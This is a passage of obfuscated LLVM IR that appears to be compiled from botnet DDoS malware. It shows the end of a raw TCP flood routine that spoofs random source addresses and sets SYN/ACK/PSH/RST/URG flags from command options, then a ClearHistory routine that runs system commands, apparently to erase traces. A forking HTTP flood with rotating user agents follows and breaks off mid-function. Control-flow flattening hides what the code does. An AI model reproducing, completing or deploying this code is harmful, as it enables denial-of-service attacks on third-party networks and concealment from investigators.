; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %11, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %19, align 4
  store i32 -1415977359, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 40, %79
  store i64 %80, i64* %.reg2mem2
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %82 = alloca i8, i64 %.reload4, align 16
  store i8* %82, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %83 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %83, %struct.iphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = bitcast %struct.iphdr* %84 to i8*
  %86 = getelementptr i8, i8* %85, i64 20
  %87 = bitcast i8* %86 to %struct.tcphdr*
  store %struct.tcphdr* %87, %struct.tcphdr** %22, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %90 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load i32, i32* %19, align 4
  %93 = call i32 @GetRandomIP(i32 %92)
  %94 = call i32 @htonl(i32 %93) #13
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 20, %96
  %98 = trunc i64 %97 to i32
  call void @makeIPPacket(%struct.iphdr* %88, i32 %91, i32 %94, i8 zeroext 6, i32 %98)
  %99 = call i32 @rand_cmwc()
  %100 = trunc i32 %99 to i16
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = call i32 @rand_cmwc()
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.0* %107 to %struct.anon.1*
  %109 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %108, i32 0, i32 2
  store i32 %105, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.0* %111 to %struct.anon.1*
  %113 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %112, i32 0, i32 3
  store i32 0, i32* %113, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.0* %115 to %struct.anon.1*
  %117 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -241
  %120 = or i16 %119, 80
  store i16 %120, i16* %117, align 4
  %121 = load i8*, i8** %12, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0)) #10
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 1036832537, i32 457464796
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -513
  %132 = or i16 %131, 512
  store i16 %132, i16* %129, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.0* %134 to %struct.anon.1*
  %136 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -1025
  %139 = or i16 %138, 1024
  store i16 %139, i16* %136, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon.0* %141 to %struct.anon.1*
  %143 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %142, i32 0, i32 4
  %144 = load i16, i16* %143, align 4
  %145 = and i16 %144, -257
  %146 = or i16 %145, 256
  store i16 %146, i16* %143, align 4
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon.0* %148 to %struct.anon.1*
  %150 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = and i16 %151, -4097
  %153 = or i16 %152, 4096
  store i16 %153, i16* %150, align 4
  %154 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.0* %155 to %struct.anon.1*
  %157 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %156, i32 0, i32 4
  %158 = load i16, i16* %157, align 4
  %159 = and i16 %158, -2049
  %160 = or i16 %159, 2048
  store i16 %160, i16* %157, align 4
  store i32 -1978999005, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %12, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %163, i8** %23, align 8
  store i32 1205193885, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = icmp ne i8* %165, null
  %167 = select i1 %166, i32 1786133599, i32 311984758
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8*, i8** %23, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.77, i32 0, i32 0)) #10
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 1929567370, i32 -279357792
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.0* %175 to %struct.anon.1*
  %177 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  store i32 -1659406993, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i32 0, i32 0)) #10
  %184 = icmp ne i32 %183, 0
  %185 = select i1 %184, i32 1179513952, i32 -872876083
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.0* %188 to %struct.anon.1*
  %190 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -1025
  %193 = or i16 %192, 1024
  store i16 %193, i16* %190, align 4
  store i32 1373259166, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8*, i8** %23, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i32 0, i32 0)) #10
  %197 = icmp ne i32 %196, 0
  %198 = select i1 %197, i32 1567803482, i32 1888758845
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.0* %201 to %struct.anon.1*
  %203 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -257
  %206 = or i16 %205, 256
  store i16 %206, i16* %203, align 4
  store i32 -2042600370, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.80, i32 0, i32 0)) #10
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 -72823926, i32 1095088128
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -4097
  %219 = or i16 %218, 4096
  store i16 %219, i16* %216, align 4
  store i32 530570046, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0)) #10
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 1449974180, i32 1149984824
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.0* %227 to %struct.anon.1*
  %229 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -2049
  %232 = or i16 %231, 2048
  store i16 %232, i16* %229, align 4
  store i32 -259846845, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* @mainCommSock, align 4
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 (i32, i8*, ...) @sockprintf(i32 %234, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.82, i32 0, i32 0), i8* %235)
  store i32 -259846845, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 530570046, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 -2042600370, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 1373259166, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -1659406993, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %242, i8** %23, align 8
  store i32 1205193885, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 -1978999005, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.0* %248 to %struct.anon.1*
  %250 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %249, i32 0, i32 5
  store i16 %246, i16* %250, align 2
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.0* %252 to %struct.anon.1*
  %254 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %253, i32 0, i32 6
  store i16 0, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon.0* %256 to %struct.anon.1*
  %258 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load i32, i32* %9, align 4
  %260 = icmp eq i32 %259, 0
  %261 = select i1 %260, i32 860297288, i32 1177244087
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_cmwc()
  store i32 -1456448047, i32* %switchVar
  store i32 %263, i32* %.reg2mem10
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #13
  %268 = zext i16 %267 to i32
  store i32 -1456448047, i32* %switchVar
  store i32 %268, i32* %.reg2mem10
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %270 = trunc i32 %.reload11 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.0* %272 to %struct.anon.1*
  %274 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %273, i32 0, i32 1
  store i16 %270, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = call zeroext i16 @tcpcsum(%struct.iphdr* %275, %struct.tcphdr* %276)
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 6
  store i16 %277, i16* %281, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %282 = bitcast i8* %.reload8 to i16*
  %283 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  %285 = load i16, i16* %284, align 2
  %286 = zext i16 %285 to i32
  %287 = call zeroext i16 @csum(i16* %282, i32 %286)
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 7
  store i16 %287, i16* %289, align 2
  %290 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %291 = load i32, i32* %10, align 4
  %292 = add nsw i32 %290, %291
  store i32 %292, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -13313955, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 1010298892, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %17, align 4
  %296 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %297 = call i64 @sendto(i32 %295, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %296, i32 16)
  %298 = load i32, i32* %19, align 4
  %299 = call i32 @GetRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #13
  %301 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = call i32 @rand_cmwc()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 3
  store i16 %304, i16* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon.0* %309 to %struct.anon.1*
  %311 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %310, i32 0, i32 2
  store i32 %307, i32* %311, align 4
  %312 = call i32 @rand_cmwc()
  %313 = trunc i32 %312 to i16
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 0
  store i16 %313, i16* %317, align 4
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 6
  store i16 0, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %323 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %324 = call zeroext i16 @tcpcsum(%struct.iphdr* %322, %struct.tcphdr* %323)
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon.0* %326 to %struct.anon.1*
  %328 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %327, i32 0, i32 6
  store i16 %324, i16* %328, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %329 = bitcast i8* %.reload6 to i16*
  %330 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 2
  %332 = load i16, i16* %331, align 2
  %333 = zext i16 %332 to i32
  %334 = call zeroext i16 @csum(i16* %329, i32 %333)
  %335 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 7
  store i16 %334, i16* %336, align 2
  %337 = load i32, i32* %25, align 4
  %338 = load i32, i32* %15, align 4
  %339 = icmp eq i32 %337, %338
  %340 = select i1 %339, i32 516781000, i32 590455956
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %343 = load i32, i32* %24, align 4
  %344 = icmp sgt i32 %342, %343
  %345 = select i1 %344, i32 -373585798, i32 513089299
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 390336409, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 -13313955, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %25, align 4
  %350 = add i32 %349, 1
  store i32 %350, i32* %25, align 4
  store i32 -13313955, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %352)
  store i32 -713875968, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %351, %348, %347, %346, %341, %294, %293, %269, %264, %262, %244, %243, %241, %240, %239, %238, %237, %233, %225, %220, %212, %207, %199, %194, %186, %181, %173, %168, %164, %161, %125, %77, %71, %70, %66, %63, %57, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.83, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.84, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [1 x i8], align 1
  %11 = alloca [512 x i8], align 16
  %12 = alloca [3 x i8*], align 16
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %9, align 8
  %17 = bitcast [3 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %17, i8* bitcast ([3 x i8*]* @sendHTTP.methods to i8*), i64 24, i32 16, i1 false)
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i32 @getdtablesize() #2
  %20 = sdiv i32 %19, 2
  store i32 %20, i32* %14, align 4
  store i32 0, i32* %7, align 4
  %switchVar = alloca i32
  store i32 -2005506097, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2005506097, label %21
    i32 -618253216, label %26
    i32 668558144, label %30
    i32 -1909965943, label %31
    i32 -1992893312, label %39
    i32 2046033021, label %108
    i32 -2135375141, label %117
    i32 227782202, label %118
    i32 -565506181, label %119
    i32 662562975, label %120
    i32 1563850475, label %123
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %14, align 4
  %24 = icmp slt i32 %22, %23
  %25 = select i1 %24, i32 -618253216, i32 1563850475
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = call i32 @fork() #2
  %28 = icmp eq i32 %27, 0
  %29 = select i1 %28, i32 668558144, i32 -565506181
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -1909965943, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = call i32 @socket_connect(i8* %32, i16 zeroext %34)
  store i32 %35, i32* %8, align 4
  %36 = load i32, i32* %8, align 4
  %37 = icmp ne i32 %36, 0
  %38 = select i1 %37, i32 -1992893312, i32 2046033021
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %41 = call i8* @strcpy(i8* %40, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0)) #2
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %43 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %44 = call i64 @strlen(i8* %43) #10
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = call i32 @rand() #2
  %47 = sext i32 %46 to i64
  %48 = urem i64 %47, 3
  %49 = getelementptr inbounds [3 x i8*], [3 x i8*]* %12, i64 0, i64 %48
  %50 = load i8*, i8** %49, align 8
  %51 = call i8* @strcpy(i8* %45, i8* %50) #2
  %52 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %54 = call i64 @strlen(i8* %53) #10
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = call i8* @strcpy(i8* %55, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.92, i32 0, i32 0)) #2
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %59 = call i64 @strlen(i8* %58) #10
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8*, i8** %4, align 8
  %62 = call i8* @strcpy(i8* %60, i8* %61) #2
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %64 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %65 = call i64 @strlen(i8* %64) #10
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = call i8* @strcpy(i8* %66, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.93, i32 0, i32 0)) #2
  %68 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %69 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %70 = call i64 @strlen(i8* %69) #10
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = call i32 @rand() #2
  %73 = sext i32 %72 to i64
  %74 = urem i64 %73, 32
  %75 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %74
  %76 = load i8*, i8** %75, align 8
  %77 = call i8* @strcpy(i8* %71, i8* %76) #2
  %78 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %79 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %80 = call i64 @strlen(i8* %79) #10
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = call i8* @strcpy(i8* %81, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.94, i32 0, i32 0)) #2
  %83 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %84 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %85 = call i64 @strlen(i8* %84) #10
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = call i32 @rand() #2
  %88 = sext i32 %87 to i64
  %89 = urem i64 %88, 3
  %90 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %89
  %91 = load i8*, i8** %90, align 8
  %92 = call i8* @strcpy(i8* %86, i8* %91) #2
  %93 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %94 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %95 = call i64 @strlen(i8* %94) #10
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = call i8* @strcpy(i8* %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0)) #2
  %98 = load i32, i32* %8, align 4
  %99 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %100 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %101 = call i64 @strlen(i8* %100) #10
  %102 = call i64 @write(i32 %98, i8* %99, i64 %101)
  %103 = load i32, i32* %8, align 4
  %104 = getelementptr inbounds [1 x i8], [1 x i8]* %10, i32 0, i32 0
  %105 = call i64 @read(i32 %103, i8* %104, i64 1)
  %106 = load i32, i32* %8, align 4
  %107 = call i32 @close(i32 %106)
  store i32 2046033021, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %110 = sext i32 %109 to i64
  %111 = load i64, i64* %9, align 8
  %112 = load i32, i32* %6, align 4
  %113 = sext i32 %112 to i64
  %114 = add nsw i64 %111, %113
  %115 = icmp sge i64 %110, %114
  %116 = select i1 %115, i32 -2135375141, i32 227782202
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  call void @_exit(i32 0) #12
  unreachable

; <label>:118:                                    ; preds = %loopEntry
  store i32 -1909965943, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 662562975, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
